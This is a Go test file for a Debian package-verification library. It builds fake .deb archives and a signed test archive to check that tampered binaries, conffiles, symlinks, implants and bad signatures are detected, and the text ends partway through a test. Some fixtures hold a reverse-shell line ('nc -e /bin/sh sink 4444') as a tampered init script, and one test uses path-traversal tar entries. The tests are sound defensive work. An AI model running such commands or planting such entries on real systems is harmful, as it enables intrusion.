package pkgverify

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path"
	"path/filepath"
	"slices"
	"sort"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/ProtonMail/go-crypto/openpgp"
	"github.com/klauspost/compress/zstd"

	"github.com/donaldsteele/telltale/internal/model"
)

// .deb fixtures are built here rather than stored: an ar archive holding
// debian-binary, control.tar.<comp> and data.tar.<comp>.

type debEntry struct {
	name string // tar member name, e.g. "./usr/bin/tool"
	body string
	link string
	mode int64
	typ  byte // tar.TypeReg when zero
}

func compressBytes(t *testing.T, comp string, b []byte) []byte {
	t.Helper()
	switch comp {
	case "xz":
		return xzBytes(t, b)
	case "zst":
		enc, err := zstd.NewWriter(nil)
		if err != nil {
			t.Fatal(err)
		}
		defer enc.Close()
		return enc.EncodeAll(b, nil)
	case "gz":
		var buf bytes.Buffer
		w := gzip.NewWriter(&buf)
		w.Write(b)
		if err := w.Close(); err != nil {
			t.Fatal(err)
		}
		return buf.Bytes()
	case "":
		return b
	}
	t.Fatalf("unknown compression %q", comp)
	return nil
}

func tarBytes(t *testing.T, entries []debEntry) []byte {
	t.Helper()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, e := range entries {
		typ := e.typ
		if typ == 0 {
			typ = tar.TypeReg
		}
		h := &tar.Header{Name: e.name, Mode: e.mode, Typeflag: typ, Linkname: e.link, ModTime: recordedNow, Uname: "root", Gname: "root", Format: tar.FormatGNU}
		if typ == tar.TypeReg {
			h.Size = int64(len(e.body))
		}
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
		if typ == tar.TypeReg {
			if _, err := tw.Write([]byte(e.body)); err != nil {
				t.Fatal(err)
			}
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

// arBytes writes a common-format ar archive the way dpkg-deb does.
func arBytes(names []string, bodies [][]byte) []byte {
	var buf bytes.Buffer
	buf.WriteString("!<arch>\n")
	for i, n := range names {
		fmt.Fprintf(&buf, "%-16s%-12d%-6d%-6d%-8o%-10d`\n", n, 0, 0, 0, 0o100644, len(bodies[i]))
		buf.Write(bodies[i])
		if len(bodies[i])%2 == 1 {
			buf.WriteByte('\n')
		}
	}
	return buf.Bytes()
}

func buildDeb(t *testing.T, comp string, conffiles []string, data []debEntry) []byte {
	t.Helper()
	return buildDebScript(t, comp, conffiles, "", data)
}

// buildDebScript is buildDeb with a postinst maintainer script.
func buildDebScript(t *testing.T, comp string, conffiles []string, postinst string, data []debEntry) []byte {
	t.Helper()
	var scripts map[string]string
	if postinst != "" {
		scripts = map[string]string{"postinst": postinst}
	}
	return buildDebControl(t, comp, conffiles, scripts, data)
}

// buildDebControl is buildDeb with the given control members (maintainer
// scripts by name; triggers is not executable, as dpkg-deb leaves it).
func buildDebControl(t *testing.T, comp string, conffiles []string, scripts map[string]string, data []debEntry) []byte {
	t.Helper()
	control := []debEntry{{name: "./", typ: tar.TypeDir, mode: 0o755}, {name: "./control", body: "Package: test\nVersion: 1\n", mode: 0o644}}
	if len(conffiles) > 0 {
		control = append(control, debEntry{name: "./conffiles", body: strings.Join(conffiles, "\n") + "\n", mode: 0o644})
	}
	names := make([]string, 0, len(scripts))
	for n := range scripts {
		names = append(names, n)
	}
	sort.Strings(names)
	for _, n := range names {
		mode := int64(0o755)
		if n == "triggers" {
			mode = 0o644
		}
		control = append(control, debEntry{name: "./" + n, body: scripts[n], mode: mode})
	}
	ext := ""
	if comp != "" {
		ext = "." + comp
	}
	return arBytes(
		[]string{"debian-binary", "control.tar" + ext, "data.tar" + ext},
		[][]byte{[]byte("2.0\n"), compressBytes(t, comp, tarBytes(t, control)), compressBytes(t, comp, tarBytes(t, data))},
	)
}

const (
	toolBin  = "tool v1 binary\n"
	toolLib  = "\x7fELF libtool\n"
	toolCtl  = "toolctl binary\n"
	toolDoc  = "documentation\n"
	toolConf = "setting=1\n"
	toolInit = "#!/bin/sh\necho starting tool\n"
	libDir   = "/usr/lib/x86_64-linux-gnu"
)

// toolDeb is a package laid out the way pre-merged-/usr packages are: one
// binary below /bin, which a merged-/usr machine has at /usr/bin, with a
// compatibility symlink /usr/bin/toolctl -> /bin/toolctl that a merged-/usr
// machine resolves to the same regular file.
func toolDeb(t *testing.T, comp string) []byte {
	t.Helper()
	dir := byte(tar.TypeDir)
	return buildDeb(t, comp, []string{"/etc/tool.conf", "/etc/init.d/tool"}, []debEntry{
		{name: "./", typ: dir, mode: 0o755},
		{name: "./bin/", typ: dir, mode: 0o755},
		{name: "./bin/toolctl", body: toolCtl, mode: 0o755},
		{name: "./etc/", typ: dir, mode: 0o755},
		{name: "./etc/init.d/", typ: dir, mode: 0o755},
		{name: "./etc/init.d/tool", body: toolInit, mode: 0o755},
		{name: "./etc/tool.conf", body: toolConf, mode: 0o644},
		{name: "./usr/", typ: dir, mode: 0o755},
		{name: "./usr/bin/", typ: dir, mode: 0o755},
		{name: "./usr/bin/tool", body: toolBin, mode: 0o755},
		{name: "./usr/bin/tool-same", typ: tar.TypeLink, link: "./usr/bin/tool", mode: 0o755},
		{name: "./usr/bin/toolctl", typ: tar.TypeSymlink, link: "/bin/toolctl", mode: 0o777},
		{name: "./usr/lib/x86_64-linux-gnu/libtool.so.1", body: toolLib, mode: 0o644},
		{name: "./usr/sbin/toold", typ: tar.TypeSymlink, link: "../bin/tool", mode: 0o777},
		{name: "./usr/share/doc/tool/README", body: toolDoc, mode: 0o644},
	})
}

func md5hex(s string) string {
	h := md5.Sum([]byte(s))
	return hex.EncodeToString(h[:])
}

func regular(path, body string, perm uint32) model.FileEntry {
	return model.FileEntry{Path: path, Type: "file", SHA256: sha256hex([]byte(body)), Mode: 0o100000 | perm, Size: int64(len(body))}
}

var toolPerms = map[string]uint32{
	"/usr/bin/toolctl":           0o755,
	"/etc/init.d/tool":           0o755,
	"/etc/tool.conf":             0o644,
	"/usr/bin/tool":              0o755,
	libDir + "/libtool.so.1":     0o644,
	"/usr/share/doc/tool/README": 0o644,
}

// toolDisk is what a merged-/usr machine has on disk for tool, with over
// replacing the content of some files.
func toolDisk(over map[string]string) map[string]string {
	disk := map[string]string{
		"/usr/bin/toolctl":           toolCtl,
		"/etc/init.d/tool":           toolInit,
		"/etc/tool.conf":             toolConf,
		"/usr/bin/tool":              toolBin,
		libDir + "/libtool.so.1":     toolLib,
		"/usr/share/doc/tool/README": toolDoc,
	}
	for k, v := range over {
		disk[k] = v
	}
	return disk
}

func toolPackage() model.Package {
	return model.Package{
		Name: "tool", Version: "1.0-1", Arch: "amd64", Status: "install ok installed",
		Files: []string{"/.", "/bin", "/bin/toolctl", "/etc", "/etc/init.d", "/etc/init.d/tool", "/etc/tool.conf", "/usr", "/usr/bin",
			"/usr/bin/tool", "/usr/bin/tool-same", "/usr/bin/toolctl", libDir + "/libtool.so.1", "/usr/sbin/toold", "/usr/share/doc/tool/README"},
		Conffiles: map[string]string{"/etc/tool.conf": md5hex(toolConf), "/etc/init.d/tool": md5hex(toolInit)},
		LocalMD5: map[string]string{
			"/bin/toolctl":               md5hex(toolCtl),
			"/usr/bin/tool":              md5hex(toolBin),
			"/usr/bin/tool-same":         md5hex(toolBin),
			libDir + "/libtool.so.1":     md5hex(toolLib),
			"/usr/share/doc/tool/README": md5hex(toolDoc),
		},
	}
}

func debianHost() model.Host {
	return model.Host{Hostname: "web01", OSID: "debian", OSVersionID: "12", Arch: "amd64"}
}

func collectionOf(disk map[string]string, pkgs ...model.Package) *model.Collection {
	files := []model.FileEntry{
		{Path: "/bin", Type: "symlink", Target: "usr/bin", Mode: 0o120777},
		{Path: "/usr/sbin/toold", Type: "symlink", Target: "../bin/tool", Mode: 0o120777},
	}
	paths := make([]string, 0, len(disk))
	for p := range disk {
		paths = append(paths, p)
	}
	sort.Strings(paths)
	for _, p := range paths {
		perm, ok := toolPerms[p]
		if !ok {
			perm = 0o755
		}
		files = append(files, regular(p, disk[p], perm))
	}
	return &model.Collection{Schema: model.CollectionSchema, Host: debianHost(), Files: files, Packages: model.Packages{Installed: pkgs}}
}

func toolCollection(over map[string]string) *model.Collection {
	return collectionOf(toolDisk(over), toolPackage())
}

type fakePkg struct {
	name, version, arch string
	deb                 []byte
}

func poolName(p fakePkg) string {
	v := p.version
	if _, after, ok := strings.Cut(v, ":"); ok {
		v = after
	}
	return "pool/main/" + p.name[:1] + "/" + p.name + "/" + p.name + "_" + v + "_" + p.arch + ".deb"
}

// fakeArchiveFiles signs one Release per suite listing a main/binary-amd64
// index with the given packages, and serves their .debs below prefix.
func fakeArchiveFiles(t *testing.T, signer *openpgp.Entity, prefix string, suites map[string][]fakePkg) map[string][]byte {
	t.Helper()
	files := map[string][]byte{}
	for suite, pkgs := range suites {
		var idx strings.Builder
		for _, p := range pkgs {
			fn := poolName(p)
			idx.WriteString(stanza(p.name, p.version, p.arch, fn, p.deb))
			files[prefix+"/"+fn] = p.deb
		}
		for k, v := range fakeSuite(t, signer, recordedNow, prefix, suite, "", map[string][]byte{"main/binary-amd64/Packages.xz": xzBytes(t, []byte(idx.String()))}) {
			files[k] = v
		}
	}
	return files
}

type fixture struct {
	srv      *archiveServer
	archives []*Archive
	old      *OldFinder
}

func newFixture(t *testing.T, suites map[string][]fakePkg) *fixture {
	t.Helper()
	srv := newArchiveServer(t, fakeArchiveFiles(t, readFakeKey(t), "/debian", suites))
	var names []string
	for s := range suites {
		names = append(names, s)
	}
	sort.Strings(names)
	a := &Archive{BaseURL: srv.URL + "/debian", Suites: names, Components: []string{"main"}, Keyring: fakePublicKeyring(t), Client: srv.Client(), Now: fixedClock(recordedNow)}
	return &fixture{srv: srv, archives: []*Archive{a}, old: testFinder(srv, fakePublicKeyring(t), fakePublicKeyring(t))}
}

func (f *fixture) opts() Options {
	return Options{Archives: f.archives, Old: f.old, Now: fixedClock(recordedNow)}
}

func toolFixture(t *testing.T) *fixture {
	t.Helper()
	return newFixture(t, map[string][]fakePkg{
		"bookworm":         nil,
		"bookworm-updates": {{"tool", "1.0-1", "amd64", toolDeb(t, "xz")}},
	})
}

func (s *archiveServer) totalHits() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	n := 0
	for _, c := range s.hits {
		n += c
	}
	return n
}

func paths(vs []FileVerdict) []string {
	out := []string{}
	for _, v := range vs {
		out = append(out, v.Path)
	}
	return out
}

func find(vs []FileVerdict, path string) (FileVerdict, bool) {
	for _, v := range vs {
		if v.Path == path {
			return v, true
		}
	}
	return FileVerdict{}, false
}

func wantPaths(t *testing.T, what string, vs []FileVerdict, want ...string) {
	t.Helper()
	if want == nil {
		want = []string{}
	}
	if got := paths(vs); !slices.Equal(got, want) {
		t.Errorf("%s = %q, want %q", what, got, want)
	}
}

func TestDebFilesXZ(t *testing.T) {
	// A real Debian .deb (data.tar.xz), recorded with Task 16's indexes.
	deb, err := os.ReadFile("testdata/debian/pool/main/s/samba/samba-ad-dc_4.17.12+dfsg-0+deb12u2_all.deb")
	if err != nil {
		t.Fatal(err)
	}
	files, err := DebFiles(bytes.NewReader(deb), int64(len(deb)))
	if err != nil {
		t.Fatal(err)
	}
	// Hashes from dpkg-deb -x and sha256sum.
	want := map[string]DebFile{
		"/usr/share/doc/samba-ad-dc/changelog.Debian.gz": {SHA256: "6a302f1809757f80e30b4aa589457e427ab0bcc2d60bb83c2dc825f5a186cd10", Mode: 0o644},
		"/usr/share/doc/samba-ad-dc/copyright":           {SHA256: "d65613995ca465deaa6eef48e38f3182d17679083fa12955a9cd9495147063d2", Mode: 0o644},
	}
	if len(files) != len(want) {
		t.Errorf("got %d files, want %d: %v", len(files), len(want), files)
	}
	for p, w := range want {
		if g, ok := files[p]; !ok || g.SHA256 != w.SHA256 || g.Mode != w.Mode || g.Text != nil || g.Conffile {
			t.Errorf("%s: got %+v (found %v), want %+v", p, g, ok, w)
		}
	}

	checkToolTable(t, toolDeb(t, "xz"))
}

// checkToolTable checks DebFiles on a toolDeb in any compression.
func checkToolTable(t *testing.T, deb []byte) {
	t.Helper()
	files, err := DebFiles(bytes.NewReader(deb), int64(len(deb)))
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for p := range files {
		got = append(got, p)
	}
	sort.Strings(got)
	want := []string{"/bin/toolctl", "/etc/init.d/tool", "/etc/tool.conf", "/usr/bin/tool", "/usr/bin/tool-same", libDir + "/libtool.so.1", "/usr/share/doc/tool/README"}
	if !slices.Equal(got, want) {
		t.Fatalf("regular files = %q, want %q (no directories or symlinks)", got, want)
	}
	if f := files["/usr/bin/tool"]; f.SHA256 != sha256hex([]byte(toolBin)) || f.Mode != 0o755 || f.Text != nil || f.Conffile {
		t.Errorf("/usr/bin/tool = %+v", f)
	}
	if f := files["/usr/bin/tool-same"]; f.SHA256 != sha256hex([]byte(toolBin)) {
		t.Errorf("hard link /usr/bin/tool-same = %+v, want the target's hash", f)
	}
	if f := files["/etc/tool.conf"]; !f.Conffile || string(f.Text) != toolConf || f.SHA256 != sha256hex([]byte(toolConf)) {
		t.Errorf("conffile /etc/tool.conf = %+v, want its text kept", f)
	}
	if f := files["/usr/share/doc/tool/README"]; f.Text != nil || f.Conffile {
		t.Errorf("README = %+v, want no text kept", f)
	}
}

func TestDebFilesZstd(t *testing.T) {
	// Ubuntu builds data.tar.zst; gzip and uncompressed members also occur.
	for _, comp := range []string{"zst", "gz", ""} {
		t.Run("comp="+comp, func(t *testing.T) { checkToolTable(t, toolDeb(t, comp)) })
	}
}

func TestDebFilesConffileTextLimit(t *testing.T) {
	big := strings.Repeat("x", maxConffileText+1)
	deb := buildDeb(t, "xz", []string{"/etc/big.conf", "/etc/small.conf"}, []debEntry{
		{name: "./etc/big.conf", body: big, mode: 0o644},
		{name: "./etc/small.conf", body: "a=1\n", mode: 0o644},
	})
	files, err := DebFiles(bytes.NewReader(deb), int64(len(deb)))
	if err != nil {
		t.Fatal(err)
	}
	if f := files["/etc/big.conf"]; !f.Conffile || f.Text != nil || f.SHA256 != sha256hex([]byte(big)) {
		t.Errorf("big conffile: conffile %v, %d bytes of text, hash ok %v", f.Conffile, len(f.Text), f.SHA256 == sha256hex([]byte(big)))
	}
	if f := files["/etc/small.conf"]; !f.Conffile || string(f.Text) != "a=1\n" {
		t.Errorf("small conffile = %+v", f)
	}
}

func TestDebFilesRejectsHostileInput(t *testing.T) {
	ok := []debEntry{{name: "./usr/bin/x", body: "x", mode: 0o755}}
	cases := map[string][]byte{
		"parent directory":        buildDeb(t, "xz", nil, append(ok, debEntry{name: "../etc/cron.d/evil", body: "x", mode: 0o644})),
		"absolute path":           buildDeb(t, "xz", nil, append(ok, debEntry{name: "/etc/cron.d/evil", body: "x", mode: 0o644})),
		"climbing out":            buildDeb(t, "xz", nil, append(ok, debEntry{name: "./usr/../../etc/evil", body: "x", mode: 0o644})),
		"duplicate file":          buildDeb(t, "xz", nil, append(ok, debEntry{name: "./usr/bin/x", body: "y", mode: 0o755})),
		"hard link to nothing":    buildDeb(t, "xz", nil, append(ok, debEntry{name: "./usr/bin/y", typ: tar.TypeLink, link: "./usr/bin/missing"})),
		"not an ar archive":       []byte("PK\x03\x04 this is a zip"),
		"truncated":               buildDeb(t, "xz", nil, ok)[:100],
		"no data member":          arBytes([]string{"debian-binary", "control.tar"}, [][]byte{[]byte("2.0\n"), tarBytes(t, nil)}),
		"unknown format version":  arBytes([]string{"debian-binary", "control.tar", "data.tar"}, [][]byte{[]byte("3.0\n"), tarBytes(t, nil), tarBytes(t, ok)}),
		"unknown compression":     arBytes([]string{"debian-binary", "control.tar", "data.tar.lz4"}, [][]byte{[]byte("2.0\n"), tarBytes(t, nil), tarBytes(t, ok)}),
		"corrupt compressed data": arBytes([]string{"debian-binary", "control.tar", "data.tar.xz"}, [][]byte{[]byte("2.0\n"), tarBytes(t, nil), []byte("\xfd7zXZ\x00garbage")}),
	}
	for name, deb := range cases {
		t.Run(name, func(t *testing.T) {
			if files, err := DebFiles(bytes.NewReader(deb), int64(len(deb))); err == nil {
				t.Fatalf("accepted: %v", files)
			}
		})
	}

	t.Run("too many entries", func(t *testing.T) {
		old := maxTarEntries
		maxTarEntries = 3
		defer func() { maxTarEntries = old }()
		deb := toolDeb(t, "xz")
		if _, err := DebFiles(bytes.NewReader(deb), int64(len(deb))); err == nil || !strings.Contains(err.Error(), "entries") {
			t.Fatalf("err = %v, want an entry limit error", err)
		}
	})
}

func TestInScope(t *testing.T) {
	for _, c := range []struct {
		path string
		mode uint32
		want bool
	}{
		{"/usr/bin/ls", 0o100755, true},
		{"/usr/bin/su", 0o104755, true},
		{"/etc/cron.daily/logrotate", 0o100755, true},
		{"/usr/share/doc/tool/README", 0o100644, false},
		{"/usr/share/tool/data.bin", 0o644, false},
		{libDir + "/libc.so.6", 0o100644, true},
		{libDir + "/libfoo.so", 0o100644, true},
		{"/usr/lib/python3/dist-packages/x.cpython-311-x86_64-linux-gnu.so", 0o100644, true},
		{libDir + "/security/pam_unix.so", 0o100644, true},
		{libDir + "/security/pam_env.conf", 0o100644, true},
		{"/lib/x86_64-linux-gnu/security/pam_env.conf", 0o100644, true},
		{"/lib/security/pam_foo.conf", 0o100644, true},
		{"/usr/lib/security/pam_foo.conf", 0o100644, true},
		{"/lib/modules/6.1.0-28-amd64/kernel/fs/x.ko.xz", 0o100644, true},
		{"/usr/lib/modules/6.1.0-28-amd64/modules.order", 0o100644, true},
		{"/boot/vmlinuz-6.1.0-28-amd64", 0o100644, true},
		{"/boot/config-6.1.0-28-amd64", 0o100644, true},
		{"/bootstrap/notes", 0o100644, false},
		{"/usr/lib/modulesx/foo", 0o100644, false},
		{libDir + "/securityx/foo", 0o100644, false},
		{"/usr/share/socket.conf", 0o100644, false},
		{"/usr/share/x.sock", 0o100644, false},
	} {
		if got := InScope(c.path, c.mode); got != c.want {
			t.Errorf("InScope(%q, %#o) = %v, want %v", c.path, c.mode, got, c.want)
		}
	}
}

func TestVerifyDetectsTamperedBinary(t *testing.T) {
	f := toolFixture(t)
	res := Verify(context.Background(), toolCollection(map[string]string{"/usr/bin/tool": "evil\n"}), f.opts())
	if res.Mode != ModeArchive {
		t.Errorf("Mode = %q", res.Mode)
	}
	wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/tool")
	want := FileVerdict{Path: "/usr/bin/tool", Package: "tool", Version: "1.0-1", Expected: sha256hex([]byte(toolBin)), Actual: sha256hex([]byte("evil\n")), Source: SourceArchive}
	if got, _ := find(res.Mismatch, "/usr/bin/tool"); got.Reason == "" || (got != FileVerdict{Path: want.Path, Package: want.Package, Version: want.Version, Expected: want.Expected, Actual: want.Actual, Reason: got.Reason, Source: want.Source, Kind: KindContentDiffers}) {
		t.Errorf("mismatch = %+v, want %+v with a reason", got, want)
	}
	// /bin/toolctl in the package is /usr/bin/toolctl on a merged-/usr
	// machine; the README is out of scope; unchanged conffiles are not
	// listed; the symlink /usr/sbin/toold is not a regular file.
	wantPaths(t, "Verified", res.Verified, "/usr/bin/toolctl", libDir+"/libtool.so.1")
	for _, v := range res.Verified {
		if v.Source != SourceArchive || v.Expected != v.Actual || v.Package != "tool" {
			t.Errorf("verified %+v", v)
		}
	}
	wantPaths(t, "Unverifiable", res.Unverifiable)
	if len(res.Conffiles) != 0 || len(res.Errors) != 0 {
		t.Errorf("conffiles %+v, errors %q", res.Conffiles, res.Errors)
	}
	if !slices.Contains(res.SourcesUsed, f.archives[0].BaseURL+" bookworm-updates") {
		t.Errorf("SourcesUsed = %q", res.SourcesUsed)
	}
}

func TestVerifyFullScope(t *testing.T) {
	f := toolFixture(t)
	opt := f.opts()
	opt.Full = true
	res := Verify(context.Background(), toolCollection(map[string]string{"/usr/share/doc/tool/README": "changed\n"}), opt)
	wantPaths(t, "Mismatch", res.Mismatch, "/usr/share/doc/tool/README")
	wantPaths(t, "Verified", res.Verified, "/usr/bin/tool", "/usr/bin/toolctl", libDir+"/libtool.so.1")
}

func TestVerifyConffileIsDiffNotMismatch(t *testing.T) {
	f := toolFixture(t)
	changed := "#!/bin/sh\nnc -e /bin/sh sink 4444\n"
	c := toolCollection(map[string]string{"/etc/init.d/tool": changed, "/usr/bin/tool": "evil\n"})
	// The machine's dpkg database claims /usr/bin/tool is a conffile too.
	// Only the signed package says what is a conffile.
	c.Packages.Installed[0].Conffiles["/usr/bin/tool"] = md5hex("evil\n")
	res := Verify(context.Background(), c, f.opts())

	if len(res.Conffiles) != 1 {
		t.Fatalf("Conffiles = %+v, want one diff", res.Conffiles)
	}
	want := ConffileDiff{Path: "/etc/init.d/tool", Package: "tool", Version: "1.0-1", Expected: sha256hex([]byte(toolInit)), Actual: sha256hex([]byte(changed)), Default: toolInit, Source: SourceArchive}
	if res.Conffiles[0] != want {
		t.Errorf("diff = %+v\nwant %+v", res.Conffiles[0], want)
	}
	wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/tool")
	for _, list := range [][]FileVerdict{res.Verified, res.Mismatch, res.Unverifiable} {
		if _, ok := find(list, "/etc/init.d/tool"); ok {
			t.Errorf("conffile listed as a file verdict: %+v", list)
		}
	}
}

func TestVerifyOnlyPaths(t *testing.T) {
	f := toolFixture(t)
	c := toolCollection(map[string]string{"/usr/bin/tool": "evil\n", libDir + "/libtool.so.1": "evil lib\n", "/usr/share/doc/tool/README": "changed\n"})
	opt := f.opts()
	// With a snapshot only changed package-owned files are checked, in or
	// out of the security-relevant scope.
	opt.OnlyPaths = map[string]bool{libDir + "/libtool.so.1": true, "/usr/share/doc/tool/README": true}
	res := Verify(context.Background(), c, opt)
	wantPaths(t, "Mismatch", res.Mismatch, libDir+"/libtool.so.1", "/usr/share/doc/tool/README")
	wantPaths(t, "Verified", res.Verified)
	wantPaths(t, "Unverifiable", res.Unverifiable)

	// Nothing changed: nothing is fetched.
	before := f.srv.totalHits()
	opt.OnlyPaths = map[string]bool{}
	res = Verify(context.Background(), c, opt)
	if n := len(res.Verified) + len(res.Mismatch) + len(res.Unverifiable); n != 0 || f.srv.totalHits() != before {
		t.Errorf("empty OnlyPaths: %d verdicts, %d requests", n, f.srv.totalHits()-before)
	}
}

func TestVerifyArchiveDownMarksCouldNotVerify(t *testing.T) {
	f := toolFixture(t)
	f.srv.setDown(true)
	res := Verify(context.Background(), toolCollection(map[string]string{"/usr/bin/tool": "evil\n"}), f.opts())
	wantPaths(t, "Verified", res.Verified)
	wantPaths(t, "Mismatch", res.Mismatch)
	wantPaths(t, "Unverifiable", res.Unverifiable, "/etc/init.d/tool", "/usr/bin/tool", "/usr/bin/toolctl", libDir+"/libtool.so.1")
	for _, v := range res.Unverifiable {
		if !strings.Contains(v.Reason, "503") || v.Package != "tool" || v.Version != "1.0-1" {
			t.Errorf("unverifiable %+v, want the archive's 503 as the reason", v)
		}
	}
	if len(res.Errors) == 0 || !strings.Contains(strings.Join(res.Errors, "\n"), "503") {
		t.Errorf("Errors = %q", res.Errors)
	}
}

func TestVerifyDownloadFailure(t *testing.T) {
	f := toolFixture(t)
	deb := "/debian/" + poolName(fakePkg{"tool", "1.0-1", "amd64", nil})
	f.srv.set(deb, []byte("not the signed package"))
	res := Verify(context.Background(), toolCollection(nil), f.opts())
	wantPaths(t, "Verified", res.Verified)
	if len(res.Unverifiable) != 4 || !strings.Contains(res.Unverifiable[0].Reason, "hash mismatch") {
		t.Errorf("Unverifiable = %+v", res.Unverifiable)
	}
	if len(res.Errors) == 0 || !strings.HasPrefix(res.Errors[0], "HASH MISMATCH") {
		t.Errorf("Errors = %q", res.Errors)
	}
}

func TestVerifyBadSignatureRejected(t *testing.T) {
	inrel := "/debian/dists/bookworm-updates/InRelease"
	for _, c := range []struct {
		name   string
		tamper func(t *testing.T, f *fixture)
	}{
		{"signed text altered", func(t *testing.T, f *fixture) {
			f.srv.set(inrel, bytes.Replace(f.srv.files[inrel], []byte("Label: Fake"), []byte("Label: Fakf"), 1))
		}},
		{"signed by an unknown key", func(t *testing.T, f *fixture) {
			files := fakeArchiveFiles(t, otherKey(t), "/debian", map[string][]fakePkg{"bookworm-updates": {{"tool", "1.0-1", "amd64", toolDeb(t, "xz")}}})
			f.srv.set(inrel, files[inrel])
		}},
	} {
		t.Run(c.name, func(t *testing.T) {
			f := toolFixture(t)
			c.tamper(t, f)
			res := Verify(context.Background(), toolCollection(map[string]string{"/usr/bin/tool": "evil\n"}), f.opts())
			wantPaths(t, "Verified", res.Verified)
			wantPaths(t, "Mismatch", res.Mismatch)
			v, ok := find(res.Unverifiable, "/usr/bin/tool")
			if !ok || !strings.Contains(v.Reason, "signature") || v.Kind != KindBadSignature {
				t.Errorf("unverifiable %+v, want a signature reason", v)
			}
			if len(res.Errors) == 0 || !strings.HasPrefix(res.Errors[0], "BAD SIGNATURE") {
				t.Errorf("Errors = %q, want BAD SIGNATURE first", res.Errors)
			}
		})
	}
}

func TestVerifyOfflineLocalWarns(t *testing.T) {
	root := t.TempDir()
	changed := "#!/bin/sh\nnc -e /bin/sh sink 4444\n"
	disk := toolDisk(map[string]string{"/usr/bin/tool": "evil\n", "/etc/init.d/tool": changed})
	for p, body := range disk {
		full := filepath.Join(root, p)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	c := collectionOf(disk, toolPackage())
	res := Verify(context.Background(), c, Options{Offline: true, Root: root})
	if res.Mode != ModeOfflineLocal {
		t.Errorf("Mode = %q", res.Mode)
	}
	if len(res.Errors) == 0 || res.Errors[0] != "Compared against the machine's own package checksums, which root can edit." {
		t.Errorf("Errors = %q, want the warning first", res.Errors)
	}
	wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/tool")
	wantPaths(t, "Verified", res.Verified, "/usr/bin/toolctl", libDir+"/libtool.so.1")
	for _, v := range append(append([]FileVerdict{}, res.Mismatch...), res.Verified...) {
		if v.Source != SourceOfflineLocal {
			t.Errorf("%s: Source = %q", v.Path, v.Source)
		}
	}
	if m, _ := find(res.Mismatch, "/usr/bin/tool"); m.Expected != "md5:"+md5hex(toolBin) || m.Actual != "md5:"+md5hex("evil\n") {
		t.Errorf("mismatch %+v", m)
	}
	if len(res.Conffiles) != 1 || res.Conffiles[0].Path != "/etc/init.d/tool" || res.Conffiles[0].Source != SourceOfflineLocal {
		t.Errorf("Conffiles = %+v", res.Conffiles)
	}

	// A file that changed after collection is not judged on stale data.
	os.WriteFile(filepath.Join(root, libDir, "libtool.so.1"), []byte("swapped\n"), 0o644)
	res = Verify(context.Background(), c, Options{Offline: true, Root: root})
	if v, ok := find(res.Unverifiable, libDir+"/libtool.so.1"); !ok || !strings.Contains(v.Reason, "changed") {
		t.Errorf("Unverifiable = %+v", res.Unverifiable)
	}
}

func TestVerifyMergedUsrSymlinks(t *testing.T) {
	f := toolFixture(t)
	c := toolCollection(map[string]string{"/usr/bin/toolctl": "trojan\n"})
	// The package ships /usr/bin/toolctl as a symlink to /bin/toolctl, and
	// /bin/toolctl as the regular file; this machine (merged /usr) has the
	// regular file at /usr/bin/toolctl. Whichever spelling comes first in
	// the file list, it is compared with the package's regular file.
	files := c.Packages.Installed[0].Files
	c.Packages.Installed[0].Files = append([]string{"/usr/bin/toolctl"}, slices.DeleteFunc(files, func(s string) bool { return s == "/usr/bin/toolctl" })...)
	res := Verify(context.Background(), c, f.opts())
	wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/toolctl")
	if m, _ := find(res.Mismatch, "/usr/bin/toolctl"); m.Expected != sha256hex([]byte(toolCtl)) {
		t.Errorf("mismatch %+v, want the package's /bin/toolctl as Expected", m)
	}

	c = toolCollection(nil)
	for i := range c.Files {
		switch c.Files[i].Path {
		case "/usr/bin/tool":
			// The package ships a regular file; a symlink elsewhere replaced it.
			c.Files[i] = model.FileEntry{Path: "/usr/bin/tool", Type: "symlink", Target: "/tmp/.x/tool", Mode: 0o120777}
		case "/usr/sbin/toold":
			// The package ships a symlink and no alias resolves to a
			// regular file: a regular file here replaced the symlink.
			c.Files[i] = regular("/usr/sbin/toold", "trojan\n", 0o755)
		}
	}
	res = Verify(context.Background(), c, f.opts())
	wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/tool", "/usr/sbin/toold")
	if m, _ := find(res.Mismatch, "/usr/bin/tool"); !strings.Contains(m.Actual, "/tmp/.x/tool") || m.Expected != sha256hex([]byte(toolBin)) {
		t.Errorf("mismatch %+v, want the symlink target as Actual", m)
	}
	if m, _ := find(res.Mismatch, "/usr/sbin/toold"); !strings.Contains(m.Reason, "no regular file") {
		t.Errorf("mismatch %+v", m)
	}
	wantPaths(t, "Verified", res.Verified, "/usr/bin/toolctl", libDir+"/libtool.so.1")
}

func TestVerifyListedButNotInPackage(t *testing.T) {
	f := toolFixture(t)
	// An implant added to the package's file list looks package-owned.
	pkg := toolPackage()
	pkg.Files = append(pkg.Files, "/usr/bin/implant")
	disk := toolDisk(map[string]string{"/usr/bin/implant": "implant\n"})
	res := Verify(context.Background(), collectionOf(disk, pkg), f.opts())
	wantPaths(t, "Mismatch", res.Mismatch, "/usr/bin/implant")
	if m, _ := find(res.Mismatch, "/usr/bin/implant"); !strings.Contains(m.Reason, "no regular file") || m.Expected != "" {
		t.Errorf("mismatch %+v", m)
	}
}

func TestVerifyOldVersionFromSnapshot(t *testing.T) {
	hello := buildDeb(t, "xz", nil, []debEntry{{name: "./usr/bin/hello", body: "hello 2.10\n", mode: 0o755}})
	pkg := model.Package{Name: "hello", Version: "2.10-3", Arch: "amd64", Status: "install ok installed", Files: []string{"/usr/bin/hello"}}
	c := collectionOf(map[string]string{"/usr/bin/hello": "hello 2.10\n"}, pkg)
